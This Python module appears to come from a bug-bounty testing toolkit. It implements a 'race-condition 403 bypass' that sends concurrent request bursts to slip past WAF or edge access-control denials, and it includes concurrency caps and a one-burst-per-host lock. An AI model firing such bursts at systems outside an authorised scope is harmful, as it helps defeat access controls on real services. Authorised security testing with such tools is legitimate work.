#!/usr/bin/env python3
"""
## Source: zero_fours zero_fours.py main loop (race condition burst)
## Source: zero_fours zero_fours.py worker pool (concurrent.futures wiring)
## License: MIT (zero_fours)
## Port: 2026-09-05

Race-condition 403 bypass (zero_fours-style).

Many WAFs and edge-layer authorizers evaluate the deny decision against
the request's *first read* of the ACL state; a burst of N requests that
races against a parallel state-flush can win one through. The classic
example is the Cloudflare "under attack" mode that briefly allows
cookies through during a JS-challenge update window.

The class never imports ``requests`` or any socket library directly --
the caller supplies ``transport`` so the probe runs through the bugwolf
HTTP lane (which enforces the scope gate).

NOTE: race bursts are inherently noisy. The :class:`Race403` class caps
default ``concurrency`` at 50 and refuses to fire more than one burst
per process per host (a ``_burst_lock`` set is process-global).
"""

from __future__ import annotations

import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Set


@dataclass
class RaceResult:
    """Outcome of one race burst."""

    url: str
    concurrency: int
    success_count: int
    success_statuses: List[int] = field(default_factory=list)
    failure_count: int = 0
    notes: List[str] = field(default_factory=list)


class Race403:
    """Race-condition bypass driver (zero_fours pattern).

    :meth:`race` fires ``concurrency`` simultaneous requests at
    ``url``; a single success (any 2xx/3xx) is recorded as a hit, and
    the per-attempt status codes are aggregated into a
    :class:`RaceResult`.

    The driver never blocks on a single transport failure -- one bad
    socket does not poison the burst.
    """

    MAX_CONCURRENCY: int = 50
    DEFAULT_CONCURRENCY: int = 10
    SUCCESS_STATUSES: Set[int] = frozenset({200, 201, 202, 204, 301, 302, 307, 308})

    # Process-global burst lock -- one burst per host. Subclasses may
    # clear this for tests.
    _burst_lock: Set[str] = set()
    _burst_lock_mutex: threading.Lock = threading.Lock()

    def __init__(self, *, max_concurrency: int = DEFAULT_CONCURRENCY):
        if max_concurrency <= 0:
            raise ValueError("max_concurrency must be positive")
        self._max_concurrency = min(max_concurrency, self.MAX_CONCURRENCY)

    def race(
        self,
        url: str,
        *,
        concurrency: int = DEFAULT_CONCURRENCY,
        transport: Optional[Callable[..., object]] = None,
    ) -> RaceResult:
        """Fire ``concurrency`` simultaneous requests at ``url``.

        ``transport`` is a zero-arg callable returning an object with a
        ``.status_code`` attribute (mirrors the ``requests.Response``
        API). If omitted, the burst returns a zero-count result (caller
        is expected to plug the HTTP lane in).
        """
        if not isinstance(url, str) or not url:
            raise ValueError("url must be a non-empty string")
        if concurrency <= 0:
            raise ValueError("concurrency must be positive")
        concurrency = min(concurrency, self._max_concurrency)

        # Scope guard -- one probe per host per process. We do NOT
        # touch the scope gate here (the transport owns that), but we
        # do refuse double-firing the same target.
        with self._burst_lock_mutex:
            if url in self._burst_lock:
                return RaceResult(
                    url=url,
                    concurrency=concurrency,
                    success_count=0,
                    notes=["burst already fired for this host in this process"],
                )
            self._burst_lock.add(url)

        if transport is None:
            return RaceResult(
                url=url,
                concurrency=concurrency,
                success_count=0,
                notes=["no transport supplied; zero requests fired"],
            )

        result = RaceResult(url=url, concurrency=concurrency, success_count=0)

        def _attempt() -> int:
            try:
                resp = transport()
            except Exception as exc:
                result.notes.append(f"transport raised {type(exc).__name__}")
                return -1
            return getattr(resp, "status_code", -1)

        with ThreadPoolExecutor(max_workers=concurrency) as pool:
            futures = [pool.submit(_attempt) for _ in range(concurrency)]
            for fut in as_completed(futures):
                status = fut.result()
                if status in self.SUCCESS_STATUSES:
                    result.success_count += 1
                    result.success_statuses.append(status)
                elif status >= 0:
                    result.failure_count += 1

        return result

    def reset_lock(self) -> None:
        """Clear the process-global burst lock (tests only)."""
        with self._burst_lock_mutex:
            self._burst_lock.clear()